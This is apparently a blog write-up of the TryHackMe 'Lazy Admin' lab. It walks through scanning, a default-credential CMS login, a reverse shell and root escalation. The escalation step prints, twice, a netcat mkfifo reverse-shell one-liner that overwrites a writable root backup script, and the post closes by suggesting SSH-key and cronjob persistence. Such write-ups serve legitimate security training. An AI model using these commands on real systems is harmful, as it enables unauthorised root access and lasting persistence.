---
layout: post
title:  "Lazy Admin THM"
image: ''
date:   2023-04-12 00:01:00
tags:
- thm
description: ''
categories:
- Learn Hacking 
---
<img src="/assets/img/sharding-gerenciamento-usuarios/servers.gif">

## Scanning

nmap scan

<img src="/assets/img/thm_pics/lazy_admin_nmap_init.png">

gobuster scan

<img src="/assets/img/thm_pics/lazy_admin_gobuster.png">

Looking into `/content/` we find a website. Running gobuster again we find some interesting sides e.g. a admin login portal.

Looking for default credentials for the side we are quite lucky and can login

<img src="/assets/img/thm_pics/lazy_admin_login.png">

We can also use `searchsploit` to further find interesting vulnerabilties for the cms solution

<img src="/assets/img/thm_pics/lazy_admin_searchsploit.png">

We also found some sql credentials

<img src="/assets/img/thm_pics/lazy_admin_sql_creds.png">

We can abuse the ad function to get a shell one the server

<img src="/assets/img/thm_pics/lazy_admin_rev_shell_login.png">

Running `sudo -l` we are quite suprised since we can run `/usr/bin/perl` as root. Digging a bit deeper we can see that there is a backup script which runs `/etc/copy.sh`. We check if we can write into the file and indeed we can. There is no editor and we have to use echo to overwrite the script. 


{% highlight bash %}
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <local-ip> 5554 >/tmp/f' >/etc/copy.sh
{% endhighlight %}


```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <local-ip> 5554 >/tmp/f' >/etc/copy.sh
```

<img src="/assets/img/thm_pics/lazy_admin_priv_esc.png">

For persistence we could include our ssh key into the `/root/.ssh/aut_key` and include a cronjob. 
